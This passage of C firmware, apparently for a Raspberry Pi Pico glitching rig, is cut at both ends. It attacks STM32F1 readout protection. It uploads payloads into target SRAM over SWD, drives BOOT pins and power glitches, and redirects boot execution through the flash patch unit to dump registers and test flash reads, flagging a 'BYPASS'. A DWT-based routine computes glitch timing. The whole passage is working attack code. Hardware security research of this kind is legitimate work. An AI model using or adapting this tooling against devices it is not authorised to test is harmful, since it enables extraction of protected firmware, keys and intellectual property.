    uint16_t partno = (val >> 4) & 0xFFF;
    if (impl == 0x41 && partno == 0xC23)
        uart_cli_printf("  Cortex-M3 r%lup%lu", (val >> 20) & 0xF, val & 0xF);
    uart_cli_send("\r\n");

    uart_cli_send("=====================\r\n");

    // Flash read tests
    uart_cli_send("\r\n=== FLASH READ TESTS ===\r\n");
    struct {
        const char *name;
        uint32_t addr;
    } flash_tests[] = {
        {"Flash base     ", 0x08000000},
        {"Reset vector   ", 0x08000004},
        {"Option bytes   ", 0x1FFFF800},
        {"OB USER/nUSER  ", 0x1FFFF802},
        {"Flash size reg ", 0x1FFFF7E0},
    };

    for (int t = 0; t < 5; t++) {
        uint64_t t0 = time_us_64();
        while (!uart_is_readable(TARGET_UART_ID)) {
            if (time_us_64() - t0 > RDR_BYTE_TIMEOUT_US) {
                uart_cli_printf("  %s (0x%08lX): TIMEOUT\r\n", flash_tests[t].name, flash_tests[t].addr);
                goto rdr_done;
            }
        }
        uint8_t status = uart_getc(TARGET_UART_ID);
        uint32_t data;
        RDR_READ_WORD(data);

        if (status == 'O') {
            uart_cli_printf("  %s (0x%08lX): OK    0x%08lX\r\n",
                           flash_tests[t].name, flash_tests[t].addr, data);
        } else if (status == 'F') {
            uart_cli_printf("  %s (0x%08lX): FAULT (PC=0x%08lX)\r\n",
                           flash_tests[t].name, flash_tests[t].addr, data);
        } else {
            uart_cli_printf("  %s (0x%08lX): ??? status=0x%02X data=0x%08lX\r\n",
                           flash_tests[t].name, flash_tests[t].addr, status, data);
        }
    }

rdr_done:
    // Check for "DONE"
    {
        char done_buf[4] = {0};
        bool got_done = true;
        for (int i = 0; i < 4; i++) {
            uint64_t t0 = time_us_64();
            while (!uart_is_readable(TARGET_UART_ID)) {
                if (time_us_64() - t0 > RDR_BYTE_TIMEOUT_US) { got_done = false; break; }
            }
            if (!got_done) break;
            done_buf[i] = uart_getc(TARGET_UART_ID);
        }
        if (got_done && memcmp(done_buf, "DONE", 4) == 0)
            uart_cli_send("\r\n=== COMPLETE ===\r\n");
        else
            uart_cli_send("\r\n=== INCOMPLETE ===\r\n");
    }

    #undef RDR_READ_WORD
    return true;
}

void target_power_glitch_regdump(uint32_t max_attempts) {
    extern bool swd_connect(void);
    extern bool swd_halt(void);
    extern bool swd_resume(void);
    extern void swd_init(void);
    extern void swd_deinit(void);
    extern uint32_t swd_write_mem(uint32_t addr, const uint32_t *data, uint32_t count);
    extern uint32_t swd_read_mem(uint32_t addr, uint32_t *data, uint32_t count);

    const stm32_target_info_t *info = ensure_target_type();
    if (!info)
        return;

    if (!sweep_calibrated) {
        uart_cli_send("ERROR: Run TARGET GLITCH SWEEP first for calibration\r\n");
        return;
    }

    uint32_t sram_base = info->sram_base;
    uint32_t payload_words = (sizeof(rdp_regdump_payload) + 3) / 4;
    const uint32_t stage2_thumb_addr = sram_base + 0x3D4 + 1;

    uart_cli_printf("RDP1 GLITCH REGDUMP: %u byte payload -> 0x%08lX\r\n",
                    (unsigned)sizeof(rdp_regdump_payload), sram_base);
    uart_cli_printf("Stage 2 entry: 0x%08lX\r\n", stage2_thumb_addr);
    uart_cli_printf("Sweep calibrated threshold: %.2fV\r\n", sweep_optimal_thresh);

    // === Step 1: Upload regdump payload to SRAM via SWD ===
    uart_cli_send("\r\n[1] Uploading regdump payload to SRAM...\r\n");
    swd_init();
    if (!swd_connect()) {
        swd_deinit();
        uart_cli_send("ERROR: SWD connect failed\r\n");
        return;
    }
    swd_halt();

    uint32_t written = swd_write_mem(sram_base, (const uint32_t *)rdp_regdump_payload, payload_words);
    if (written != payload_words) {
        uart_cli_printf("ERROR: SRAM write failed (%lu/%lu words)\r\n", written, payload_words);
        swd_deinit();
        return;
    }

    uint32_t readback[payload_words];
    uint32_t nread = swd_read_mem(sram_base, readback, payload_words);
    if (nread != payload_words || memcmp(readback, rdp_regdump_payload, sizeof(rdp_regdump_payload)) != 0) {
        uart_cli_send("ERROR: SRAM verify failed\r\n");
        swd_deinit();
        return;
    }
    uart_cli_send("    Payload uploaded and verified\r\n");

    swd_resume();
    swd_deinit();

    // === Step 2: Set BOOT0=1, BOOT1=1 for SRAM boot mode ===
    uart_cli_send("[2] Setting BOOT0=HIGH, BOOT1=HIGH (SRAM boot mode)\r\n");
    gpio_init(BOOT0_PIN);
    gpio_set_dir(BOOT0_PIN, GPIO_OUT);
    gpio_put(BOOT0_PIN, 1);
    gpio_init(BOOT1_PIN);
    gpio_set_dir(BOOT1_PIN, GPIO_OUT);
    gpio_put(BOOT1_PIN, 1);

    // === Step 3: Power glitch to trigger POR — stage 1 runs from SRAM ===
    float thresh_v = sweep_optimal_thresh;
    uart_cli_printf("[3] Power glitch for POR (threshold: %.2fV, max %lu attempts)...\r\n",
                    thresh_v, max_attempts);

    gpio_set_mask(POWER_MASK);
    sleep_ms(50);

    gpio_init(reset_pin);
    gpio_set_dir(reset_pin, GPIO_IN);
    gpio_pull_up(reset_pin);

    adc_power_init();
    uint32_t thresh = (uint32_t)(thresh_v / 3.3f * 4095.0f);

    bool stage1_ok = false;
    glitch_result_t gr;

    for (uint32_t attempt = 1; attempt <= max_attempts; attempt++) {
        nrst_irq_arm();

        gpio_set_dir(POWER_PIN2, GPIO_IN);
        gpio_set_dir(POWER_PIN3, GPIO_IN);
        gpio_disable_pulls(POWER_PIN2);
        gpio_disable_pulls(POWER_PIN3);

        adc_select_input(ADC_POWER_CHAN);
        gr.vmin_raw = 4095;
        gr.nrst_went_low = false;
        gr.thresh_reached = true;

        uint64_t t0 = time_us_64();
        gpio_clr_mask(1u << POWER_PIN1);

        while (true) {
            uint16_t val = adc_read();
            if (val < gr.vmin_raw) gr.vmin_raw = val;
            if (val <= thresh) break;
            if (time_us_64() - t0 > 500000) { gr.thresh_reached = false; break; }
        }

        if (gr.thresh_reached) {
            sleep_us(50);
            uint16_t val = adc_read();
            if (val < gr.vmin_raw) gr.vmin_raw = val;
        }

        gpio_set_dir(POWER_PIN2, GPIO_OUT);
        gpio_set_dir(POWER_PIN3, GPIO_OUT);
        gpio_set_mask(POWER_MASK);
        gr.glitch_us = (uint32_t)(time_us_64() - t0);

        for (int i = 0; i < 5000; i++) {
            if (!gpio_get(reset_pin)) { gr.nrst_went_low = true; break; }
            sleep_us(10);
        }
        nrst_irq_disarm();
        if (!gr.nrst_went_low && nrst_irq_fired) gr.nrst_went_low = true;

        float vmin = gr.vmin_raw * 3.3f / 4095.0f;
        uart_cli_printf("  [%lu] Vmin=%.2fV glitch=%luus nRST=%s\r\n",
                        attempt, vmin, gr.glitch_us,
                        gr.nrst_went_low ? "LOW" : "high");

        if (gr.nrst_went_low) {
            uart_cli_send("    POR triggered — stage 1 configuring FPB...\r\n");
            stage1_ok = true;
            break;
        }

        gpio_set_mask(POWER_MASK);
        sleep_ms(200);
    }

    gpio_set_mask(POWER_MASK);

    if (!stage1_ok) {
        uart_cli_send("\r\nFAILED: Could not trigger POR for stage 1\r\n");
        gpio_put(BOOT0_PIN, 0);
        gpio_put(BOOT1_PIN, 0);
        return;
    }

    // Wait for stage 1 to complete (FPB config + STOP/wake + UART report)
    uart_cli_send("    Waiting for stage 1 to complete...\r\n");
    sleep_ms(500);

    // === Step 4: Init UART ===
    uart_cli_send("[4] Initializing UART RX...\r\n");
    uart_deinit(TARGET_UART_ID);
    gpio_deinit(TARGET_UART_RX_PIN);
    gpio_init(TARGET_UART_RX_PIN);
    uart_init(TARGET_UART_ID, 115200);
    uart_set_format(TARGET_UART_ID, 8, 1, UART_PARITY_NONE);
    gpio_set_function(TARGET_UART_RX_PIN, GPIO_FUNC_UART);

    // === Step 5: Set BOOT0=0, pulse nRST — flash boot with FPB redirect to stage 2 ===
    uart_cli_send("[5] Setting BOOT0=LOW (flash boot), pulsing nRST...\r\n");
    gpio_put(BOOT0_PIN, 0);
    gpio_put(BOOT1_PIN, 0);
    sleep_ms(10);

    while (uart_is_readable(TARGET_UART_ID))
        uart_getc(TARGET_UART_ID);

    gpio_init(reset_pin);
    gpio_set_dir(reset_pin, GPIO_OUT);
    gpio_put(reset_pin, 0);
    sleep_ms(10);
    gpio_put(reset_pin, 1);
    gpio_set_dir(reset_pin, GPIO_IN);
    gpio_pull_up(reset_pin);

    // === Step 6: Receive regdump results ===
    uart_cli_send("[6] Receiving register dump...\r\n");
    receive_regdump_results();

    uart_cli_send("[7] Power cycling target...\r\n");
    gpio_clr_mask(POWER_MASK);
    sleep_ms(100);
    gpio_set_mask(POWER_MASK);

    gpio_put(BOOT0_PIN, 0);
    gpio_put(BOOT1_PIN, 0);
}

void target_power_resettest(void) {
    extern bool swd_connect_under_reset(void);
    extern void swd_init(void);
    extern void swd_deinit(void);
    extern uint32_t swd_write_mem(uint32_t addr, const uint32_t *data, uint32_t count);
    extern uint32_t swd_read_mem(uint32_t addr, uint32_t *data, uint32_t count);
    extern bool swd_write_core_reg(uint8_t reg, uint32_t value);

    const stm32_target_info_t *info = ensure_target_type();
    if (!info)
        return;

    uint32_t sram_base = info->sram_base;
    uint32_t payload_words = (sizeof(rdp_resettest_payload) + 3) / 4;
    const uint32_t stage2_thumb_addr = sram_base + 0x3EC + 1;

    uart_cli_printf("RDP1 RESET TEST: %u byte payload -> 0x%08lX\r\n",
                    (unsigned)sizeof(rdp_resettest_payload), sram_base);
    uart_cli_printf("Stage 2 entry: 0x%08lX\r\n", stage2_thumb_addr);

    uart_cli_send("\r\n[1] Connecting under reset...\r\n");
    swd_init();

    gpio_init(BOOT0_PIN);
    gpio_set_dir(BOOT0_PIN, GPIO_OUT);
    gpio_put(BOOT0_PIN, 0);
    gpio_init(BOOT1_PIN);
    gpio_set_dir(BOOT1_PIN, GPIO_OUT);
    gpio_put(BOOT1_PIN, 0);

    if (!swd_connect_under_reset()) {
        swd_deinit();
        uart_cli_send("ERROR: SWD connect under reset failed\r\n");
        return;
    }
    uart_cli_send("    Connected, core halted under reset\r\n");

    uart_cli_send("[2] Clearing BKP_DR1 (phase counter)...\r\n");
    uint32_t apb1enr;
    swd_read_mem(0x4002101C, &apb1enr, 1);
    apb1enr |= 0x18000000;
    swd_write_mem(0x4002101C, &apb1enr, 1);
    uint32_t pwr_cr;
    swd_read_mem(0x40007000, &pwr_cr, 1);
    pwr_cr |= 0x100;
    swd_write_mem(0x40007000, &pwr_cr, 1);
    sleep_ms(5);
    uint32_t zero = 0;
    swd_write_mem(0x40006C04, &zero, 1);

    uart_cli_send("[3] Uploading resettest payload to SRAM...\r\n");
    uint32_t written = swd_write_mem(sram_base, (const uint32_t *)rdp_resettest_payload, payload_words);
    if (written != payload_words) {
        uart_cli_printf("ERROR: SRAM write failed (%lu/%lu words)\r\n", written, payload_words);
        swd_deinit();
        return;
    }

    uint32_t readback[payload_words];
    uint32_t nread = swd_read_mem(sram_base, readback, payload_words);
    if (nread != payload_words || memcmp(readback, rdp_resettest_payload, sizeof(rdp_resettest_payload)) != 0) {
        uart_cli_send("ERROR: SRAM verify failed\r\n");
        swd_deinit();
        return;
    }
    uart_cli_send("    Payload uploaded and verified\r\n");

    uart_cli_send("[4] Configuring FPB via SWD...\r\n");
    uint32_t remap_val = stage2_thumb_addr;
    swd_write_mem(sram_base + 0x20, &remap_val, 1);
    uint32_t fp_ctrl = 0x03;
    swd_write_mem(0xE0002000, &fp_ctrl, 1);
    uint32_t fp_remap = 0x20000020;
    swd_write_mem(0xE0002004, &fp_remap, 1);
    uint32_t fp_comp0 = 0x05;
    swd_write_mem(0xE0002008, &fp_comp0, 1);

    uint32_t verify_val;
    swd_read_mem(0xE0002000, &verify_val, 1);
    uart_cli_printf("    FP_CTRL:  0x%08lX\r\n", verify_val);

    uint32_t demcr_val = 0;
    swd_write_mem(0xE000EDFC, &demcr_val, 1);

    uart_cli_send("[5] Running stage 1 (STOP/wake debug kill)...\r\n");
    uint32_t stage1_addr = sram_base + 0x200 + 1;
    swd_write_core_reg(13, 0x20005000);
    swd_write_core_reg(15, stage1_addr);

    uart_deinit(TARGET_UART_ID);
    gpio_deinit(TARGET_UART_RX_PIN);
    gpio_init(TARGET_UART_RX_PIN);
    uart_init(TARGET_UART_ID, 115200);
    uart_set_format(TARGET_UART_ID, 8, 1, UART_PARITY_NONE);
    gpio_set_function(TARGET_UART_RX_PIN, GPIO_FUNC_UART);

    uint32_t dhcsr_val;
    dhcsr_val = 0xA05F0003;
    swd_write_mem(0xE000EDF0, &dhcsr_val, 1);
    dhcsr_val = 0xA05F0001;
    swd_write_mem(0xE000EDF0, &dhcsr_val, 1);
    dhcsr_val = 0xA05F0000;
    swd_write_mem(0xE000EDF0, &dhcsr_val, 1);
    swd_deinit();

    sleep_ms(200);
    uart_cli_send("    Stage 1 report: ");
    int s1_chars = 0;
    while (uart_is_readable(TARGET_UART_ID) && s1_chars < 20) {
        uint8_t c = uart_getc(TARGET_UART_ID);
        uart_cli_printf("%02X ", c);
        s1_chars++;
    }
    if (s1_chars == 0) uart_cli_send("(nothing received)");
    uart_cli_send("\r\n");

    uart_cli_send("[6] Pulsing nRST (flash boot with FPB redirect)...\r\n");
    while (uart_is_readable(TARGET_UART_ID))
        uart_getc(TARGET_UART_ID);

    uint8_t reset_pin = 15;
    gpio_init(reset_pin);
    gpio_set_dir(reset_pin, GPIO_OUT);
    gpio_put(reset_pin, 0);
    sleep_ms(10);
    gpio_put(reset_pin, 1);
    gpio_set_dir(reset_pin, GPIO_IN);
    gpio_pull_up(reset_pin);

    uart_cli_send("[7] Receiving test results...\r\n");
    const char *phase_names[] = {
        "Baseline + STOP cycling",
        "Post-IWDG reset",
        "Post-WWDG reset",
        "Post-STANDBY wakeup",
    };
    /* RCC_CSR bits 24-31: LPWR(24), ?(25), PIN(26), POR(27), SFT(28), IWDG(29), WWDG(30), LPWR2(31) */
    const char *reset_flag_names[] = {
        "LPWR", "?25", "PIN", "POR", "SFT", "IWDG", "WWDG", "LPWR2"
    };

    /* Helper: read one byte with timeout, returns -1 on timeout */
    #define READ_BYTE(dst, timeout_us) do { \
        uint64_t _dl = time_us_64() + (timeout_us); \
        int _got = 0; \
        while (time_us_64() < _dl) { \
            if (uart_is_readable(TARGET_UART_ID)) { \
                (dst) = uart_getc(TARGET_UART_ID); \
                _got = 1; break; \
            } \
        } \
        if (!_got) { uart_cli_send("  (byte timeout)\r\n"); goto resettest_done; } \
    } while(0)

    #define READ_WORD(dst, timeout_us) do { \
        (dst) = 0; \
        for (int _i = 0; _i < 4; _i++) { \
            uint8_t _b; READ_BYTE(_b, (timeout_us)); \
            (dst) |= ((uint32_t)_b) << (_i * 8); \
        } \
    } while(0)

    uint64_t total_start = time_us_64();
    bool done = false;

    while (!done && (time_us_64() - total_start) < 30000000) {
        /* Wait for "RST1" header */
        uint8_t hdr_state = 0;
        const char *hdr_str = "RST1";
        uint64_t phase_start = time_us_64();
        bool hdr_found = false;

        while (!hdr_found && (time_us_64() - phase_start) < 5000000) {
            if (uart_is_readable(TARGET_UART_ID)) {
                uint8_t c = uart_getc(TARGET_UART_ID);
                if (c == hdr_str[hdr_state]) {
                    hdr_state++;
                    if (hdr_state == 4) hdr_found = true;
                } else {
                    hdr_state = (c == 'R') ? 1 : 0;
                }
            }
        }

        if (!hdr_found) {
            uart_cli_send("    No RST1 header received\r\n");
            break;
        }

        uint8_t phase;
        READ_BYTE(phase, 500000);
        const char *pname = (phase < 4) ? phase_names[phase] : "Unknown";
        uart_cli_printf("\r\n=== Phase %u: %s ===\r\n", phase, pname);

        uint32_t rcc_csr;
        READ_WORD(rcc_csr, 500000);
        uart_cli_printf("  RCC_CSR: 0x%08lX (", rcc_csr);
        for (int i = 0; i < 8; i++) {
            if (rcc_csr & (1u << (24 + i)))
                uart_cli_printf("%s ", reset_flag_names[i]);
        }
        uart_cli_send(")\r\n");

        /* Flash test result: 'O'+data or 'F'+PC */
        uint8_t status;
        READ_BYTE(status, 2000000);
        uint32_t flash_val;
        READ_WORD(flash_val, 500000);

        if (status == 'O') {
            uart_cli_printf("  Flash 0x08000000: OK  0x%08lX", flash_val);
            if (flash_val == 0xCAFEF00D)
                uart_cli_send(" *** BYPASS! ***");
            uart_cli_send("\r\n");
        } else if (status == 'F') {
            uart_cli_printf("  Flash 0x08000000: FAULT (PC=0x%08lX)\r\n", flash_val);
        } else {
            uart_cli_printf("  Flash test: unexpected 0x%02X val=0x%08lX\r\n", status, flash_val);
        }

        /* Trailer: 'C'=cycling, 'N'=next reset, 'D'=done */
        uint8_t trailer;
        READ_BYTE(trailer, 5000000);

        if (trailer == 'C') {
            uart_cli_send("  STOP cycling...\r\n");
            /* Wait for 'T' (cycling done) */
            uint8_t t;
            READ_BYTE(t, 10000000);
            if (t == 'T') {
                /* Post-cycling flash test */
                READ_BYTE(status, 2000000);
                READ_WORD(flash_val, 500000);
                if (status == 'O') {
                    uart_cli_printf("  Post-STOP flash: OK  0x%08lX", flash_val);
                    if (flash_val == 0xCAFEF00D)
                        uart_cli_send(" *** BYPASS! ***");
                    uart_cli_send("\r\n");
                } else if (status == 'F') {
                    uart_cli_printf("  Post-STOP flash: FAULT (PC=0x%08lX)\r\n", flash_val);
                } else {
                    uart_cli_printf("  Post-STOP flash: unexpected 0x%02X\r\n", status);
                }
                READ_BYTE(trailer, 2000000);
            } else {
                uart_cli_printf("  Expected 'T', got 0x%02X\r\n", t);
                break;
            }
        }

        if (trailer == 'N') {
            uart_cli_send("  -> Next reset...\r\n");
            sleep_ms(200);
        } else if (trailer == 'D') {
            /* Read "ONE" after 'D' */
            uint8_t o, n, e;
            READ_BYTE(o, 500000);
            READ_BYTE(n, 500000);
            READ_BYTE(e, 500000);
            uart_cli_send("\r\n=== ALL PHASES COMPLETE ===\r\n");
            done = true;
        } else {
            uart_cli_printf("  Unexpected trailer: 0x%02X\r\n", trailer);
            break;
        }
    }

    if (!done)
        uart_cli_send("\r\n=== TEST COMPLETE (STANDBY phase lost SRAM — expected) ===\r\n");

    #undef READ_BYTE
    #undef READ_WORD

resettest_done:

    uart_cli_send("[8] Power cycling target...\r\n");
    gpio_clr_mask(POWER_MASK);
    sleep_ms(100);
    gpio_set_mask(POWER_MASK);
}

// ============================================================
// TARGET GLITCH TIMING — DWT cycle counter + ADC shunt profile
// ============================================================

#define ADC_SHUNT_PIN   27  // GP27 = ADC1, shunt resistor on target VDD
#define ADC_SHUNT_CHAN  1

void target_power_timing(const char *name_or_addr, uint32_t samples, bool bootloader_mode) {
    // Ensure target type is set
    const stm32_target_info_t *info = ensure_target_type();
    if (!info) {
        uart_cli_send("ERROR: No STM32 target detected. Set with TARGET STM32F1\r\n");
        return;
    }

    const stm32_bp_table_t *table = stm32_get_breakpoints(target_get_type());

    // No args: list breakpoints
    if (!name_or_addr) {
        if (!table) {
            uart_cli_send("ERROR: No breakpoint table for this target\r\n");
            return;
        }
        uart_cli_printf("=== Breakpoint Table: %s (%u entries) ===\r\n", table->name, table->count);
        uart_cli_send("  NAME              ADDR        CATEGORY      DESCRIPTION\r\n");
        for (int i = 0; i < table->count; i++) {
            const stm32_bp_entry_t *e = &table->entries[i];
            uart_cli_printf("  %-16s  0x%08lX  %-12s  %s\r\n",
                            e->name, e->addr,
                            stm32_bp_category_name(e->category), e->desc);
        }
        uart_cli_send("\r\nUsage: TARGET GLITCH TIMING <name|0xADDR> [samples] [FLASH|BOOTLOADER]\r\n");
        return;
    }

    // Resolve breakpoint address
    uint32_t bp_addr = 0;
    const char *bp_name = NULL;
    const stm32_bp_entry_t *entry = NULL;

    if (name_or_addr[0] == '0' && (name_or_addr[1] == 'x' || name_or_addr[1] == 'X')) {
        bp_addr = strtoul(name_or_addr, NULL, 16);
        if (table)
            entry = stm32_find_breakpoint(table, name_or_addr);
        bp_name = entry ? entry->name : name_or_addr;
    } else {
        if (!table) {
            uart_cli_send("ERROR: No breakpoint table for this target\r\n");
            return;
        }
        entry = stm32_find_breakpoint(table, name_or_addr);
        if (!entry) {
            uart_cli_printf("ERROR: Unknown breakpoint '%s'. Run TIMING with no args to list.\r\n", name_or_addr);
            return;
        }
        bp_addr = entry->addr;
        bp_name = entry->name;
    }

    if (bp_addr == 0) {
        uart_cli_send("ERROR: Invalid breakpoint address\r\n");
        return;
    }

    if (samples == 0) samples = 32768;
    if (samples > 32768) samples = 32768;

    uart_cli_printf("\r\n=== TIMING: %s (0x%08lX) ===\r\n", bp_name, bp_addr);
    uart_cli_printf("Boot mode: %s (BOOT0=%u)\r\n",
                    bootloader_mode ? "BOOTLOADER" : "FLASH",
                    bootloader_mode ? 1 : 0);
    if (entry)
        uart_cli_printf("Category: %s — %s\r\n", stm32_bp_category_name(entry->category), entry->desc);

    // === Step 1: Set BOOT0 pin ===
    uart_cli_send("[1] Configuring BOOT pins...\r\n");
    gpio_init(STM32_BOOT0_PIN);
    gpio_set_dir(STM32_BOOT0_PIN, GPIO_OUT);
    gpio_put(STM32_BOOT0_PIN, bootloader_mode ? 1 : 0);
    gpio_init(STM32_BOOT1_PIN);
    gpio_set_dir(STM32_BOOT1_PIN, GPIO_OUT);
    gpio_put(STM32_BOOT1_PIN, 0);

    // === Step 2: Connect under reset (halts at reset vector via VC_CORERESET) ===
    uart_cli_send("[2] Connect under reset...\r\n");
    swd_init();
    if (!swd_connect_under_reset()) {
        uart_cli_send("ERROR: Connect under reset failed\r\n");
        swd_deinit();
        return;
    }
    uart_cli_send("    Core halted at reset vector\r\n");

    // Verify initial halt state — read PC and vector table
    {
        // Debug: check DHCSR S_REGRDY and DCRDR before/after DCRSR write
        uint32_t dhcsr_before, dcrdr_before, dcrdr_after;
        swd_read_mem(DHCSR, &dhcsr_before, 1);
        swd_read_mem(0xE000EDF8, &dcrdr_before, 1);  // DCRDR
        uart_cli_printf("    Pre-reg: DHCSR=0x%08lX DCRDR=0x%08lX\r\n",
                        dhcsr_before, dcrdr_before);

        uint32_t pc_init;
        bool ok = swd_read_core_reg(15, &pc_init);
        swd_read_mem(0xE000EDF8, &dcrdr_after, 1);
        uart_cli_printf("    Post-reg: ok=%d PC=0x%08lX DCRDR=0x%08lX\r\n",
                        ok, pc_init, dcrdr_after);

        uint32_t vtor[2];
        swd_read_mem(0x1FFFF000, vtor, 2);
        uart_cli_printf("    VT[SP]=0x%08lX VT[Reset]=0x%08lX\r\n", vtor[0], vtor[1]);
    }

    // === Step 3: Configure DWT + FPB while core is halted ===
    // Core is halted at reset vector via VC_CORERESET. FPB/DWT/DEMCR are all
    // in the debug power domain and survive nRST (only POR clears them).
    uart_cli_send("[3] Configuring DWT + FPB...\r\n");
    uint32_t zero = 0;

    // DEMCR: keep VC_CORERESET to re-catch core after watchdog reset,
    // plus TRCENA (DWT) and VC_HARDERR (catch hard faults)
    uint32_t demcr_val = (1u << 24) | (1u << 10) | (1u << 0);  // TRCENA | VC_HARDERR | VC_CORERESET
    swd_write_mem(DEMCR, &demcr_val, 1);

    // DWT_CTRL.CYCCNTENA = 1
    uint32_t dwt_ctrl = 1;
    swd_write_mem(0xE0001000, &dwt_ctrl, 1);

    // Zero cycle counter
    swd_write_mem(0xE0001004, &zero, 1);

    // STM32F1 boot ROM is on a dedicated bus that bypasses FPB/DWT instruction
    // matching. Instead use DWT data watchpoint on a peripheral register that the
    // boot ROM reads at the point of interest.
    //
    // Strategy: watch for reads of FLASH_OBR (0x4002201C) — the RDP status register.
    // The boot ROM reads this to decide if readout protection is active.
    // DWT data read watchpoint works on the system bus (D-code), not I-code.
    //
    // For non-RDP breakpoints, fall back to watching a known data access near the
    // target address. For now, always watch FLASH_OBR as primary strategy.

    // DWT data watchpoint: try RCC_CR write (0x40021000) — bootloader writes this early
    // If boot ROM bypasses DWT for reads, try writes to peripherals instead
    uint32_t watch_addr = 0x40021000;  // RCC_CR (clock control)
    swd_write_mem(0xE0001020, &watch_addr, 1);  // DWT_COMP0
    swd_write_mem(0xE0001024, &zero, 1);         // DWT_MASK0 = 0 (exact)
    // DWT_FUNCTION0 = 0x7: data address read/write watchpoint
    uint32_t dwt_func = 0x7;  // Data address read OR write
    swd_write_mem(0xE0001028, &dwt_func, 1);

    // Freeze IWDG/WWDG in debug halt (DBGMCU_CR)
    {
        uint32_t dbg_cr;
        swd_read_mem(0xE0042004, &dbg_cr, 1);
        dbg_cr |= (1u << 8) | (1u << 9);  // IWDG_STOP | WWDG_STOP
        swd_write_mem(0xE0042004, &dbg_cr, 1);
    }

    // Verify
    uint32_t v_dwt_comp, v_dwt_func;
    swd_read_mem(0xE0001020, &v_dwt_comp, 1);
    swd_read_mem(0xE0001028, &v_dwt_func, 1);
    uart_cli_printf("    DWT data watchpoint: COMP0=0x%08lX FUNC0=0x%08lX\r\n",
                    v_dwt_comp, v_dwt_func);

    // === Step 4: Two-stage boot: let watchdog fire, then measure second boot ===
    // Stage A: Resume with VC_CORERESET to survive the watchdog reset
    uart_cli_send("[4a] First boot (absorb watchdog)...\r\n");
    swd_write_mem(0xE0001004, &zero, 1);  // Zero CYCCNT
    swd_resume();

    // Wait for watchdog reset + VC_CORERESET re-halt
    uint32_t dhcsr_poll = 0;
    bool stage_a_ok = false;
    for (int i = 0; i < 500; i++) {  // 500ms max
        swd_read_mem(DHCSR, &dhcsr_poll, 1);
        if ((dhcsr_poll & (1u << 17)) && (dhcsr_poll & (1u << 25))) {
            // S_HALT + S_RESET_ST: caught after watchdog reset
            stage_a_ok = true;
            break;
        }
        sleep_ms(1);
    }

    if (!stage_a_ok) {
        uart_cli_printf("    Stage A failed: DHCSR=0x%08lX\r\n", dhcsr_poll);
        goto print_adc;
    }

    uint32_t cyccnt_first;
    swd_read_mem(0xE0001004, &cyccnt_first, 1);
    uart_cli_printf("    Watchdog fired after %lu cycles (%.2fms)\r\n",
                    cyccnt_first, (float)cyccnt_first / 8000.0f);

    // Stage B: Now halted at reset vector after watchdog.
    // Clear VC_CORERESET, set up DWT data watchpoint, zero CYCCNT, resume.
    uart_cli_send("[4b] Second boot (DWT watchpoint active)...\r\n");
    demcr_val = (1u << 24) | (1u << 10);  // TRCENA | VC_HARDERR (no VC_CORERESET)
    swd_write_mem(DEMCR, &demcr_val, 1);

    // Re-configure DWT (MATCHED may have been cleared by reset)
    swd_write_mem(0xE0001020, &watch_addr, 1);  // DWT_COMP0
    swd_write_mem(0xE0001024, &zero, 1);         // DWT_MASK0
    uint32_t dwt_func_b = 0x5;
    swd_write_mem(0xE0001028, &dwt_func_b, 1);  // DWT_FUNCTION0 = data read

    // Zero CYCCNT for fresh measurement
    swd_write_mem(0xE0001004, &zero, 1);

    // Resume for second boot
    swd_resume();
    uint64_t t0 = time_us_64();

    // Poll DHCSR — DWT data watchpoint should fire within microseconds
    uint32_t poll_count = 0;
    bool poll_halted = false;
    bool poll_reset = false;
    uint32_t window_us = 50000;  // 50ms

    while (time_us_64() - t0 < window_us) {
        swd_read_mem(DHCSR, &dhcsr_poll, 1);
        poll_count++;

        if (dhcsr_poll & (1u << 17)) {  // S_HALT — watchpoint fired!
            poll_halted = true;
            break;
        }
        if (dhcsr_poll & (1u << 25)) {  // S_RESET_ST — watchdog again
            poll_reset = true;
            break;
        }
    }

    uint64_t t_sample_end = time_us_64();
    uint32_t sample_us = (uint32_t)(t_sample_end - t0);

    // ADC not sampled in poll mode
    static uint16_t adc_buf[32768];
    uint32_t adc_count = 0;

    // === Step 5: Analyze results ===
    uart_cli_printf("[5] Poll done: %lu reads in %luus, DHCSR=0x%08lX\r\n",
                    poll_count, sample_us, dhcsr_poll);

    bool halted = poll_halted;
    bool lockup = (dhcsr_poll & (1u << 19)) != 0;

    if (halted) {
        uint32_t pc_now;
        swd_read_core_reg(15, &pc_now);
        uint32_t dwt_func_now, dwt_cyccnt;
        swd_read_mem(0xE0001028, &dwt_func_now, 1);  // DWT_FUNCTION0
        swd_read_mem(0xE0001004, &dwt_cyccnt, 1);    // DWT_CYCCNT
        bool dwt_matched = (dwt_func_now & (1u << 24)) != 0;
        uart_cli_printf("    PC=0x%08lX DWT_FUNC0=0x%08lX CYCCNT=%lu%s%s\r\n",
                        pc_now, dwt_func_now, dwt_cyccnt,
                        poll_reset ? " RESET" : "",
                        dwt_matched ? " DWT_MATCHED" : "");
    } else {
        uart_cli_printf("    NOT_HALTED%s\r\n", poll_reset ? " RESET" : "");
    }

    if (halted) {
        uint32_t cyccnt;
        swd_read_mem(0xE0001004, &cyccnt, 1);

        uint32_t pc;
        swd_read_core_reg(15, &pc);

        float time_ms = (float)cyccnt / 8000.0f;

        uart_cli_printf("\r\nDWT_CYCCNT: %lu cycles (%.2fms @ 8MHz HSI)\r\n", cyccnt, time_ms);
        uart_cli_printf("           ^^^^^^^^ use this as PAUSE for glitch targeting\r\n");
        uart_cli_printf("PC: 0x%08lX %s\r\n", pc,
                        (pc == bp_addr || pc == (bp_addr | 1)) ? "(MATCH)" : "(MISMATCH)");

        // Verify FPB still intact
        uint32_t fp_comp_after;
        swd_read_mem(0xE0002008, &fp_comp_after, 1);
        uart_cli_printf("FP_COMP0 after: 0x%08lX\r\n", fp_comp_after);

        // Pico equivalent: STM32 8MHz -> Pico 150MHz = x18.75
        uint32_t pause_pico = (uint32_t)((float)cyccnt * 18.75f);
        uart_cli_printf("\r\nPICO PAUSE equivalent: %lu cycles (150MHz)\r\n", pause_pico);
        uart_cli_printf("    SET PAUSE %lu\r\n", pause_pico);
    } else {
        uart_cli_send("WARNING: Core not halted — breakpoint may not have been reached yet\r\n");
        uart_cli_send("         Try increasing sample count or check breakpoint address\r\n");
    }

    // Cleanup FPB
    uint32_t fp_disable = 0x02;
    swd_write_mem(0xE0002000, &fp_disable, 1);
    swd_write_mem(0xE0002008, &zero, 1);

print_adc:
    // === ADC trace ===
    uart_cli_printf("\r\nADC shunt profile (%lu samples, %luus total, ~%luus/sample):\r\n",
                    adc_count, sample_us,
                    adc_count > 0 ? sample_us / adc_count : 0);

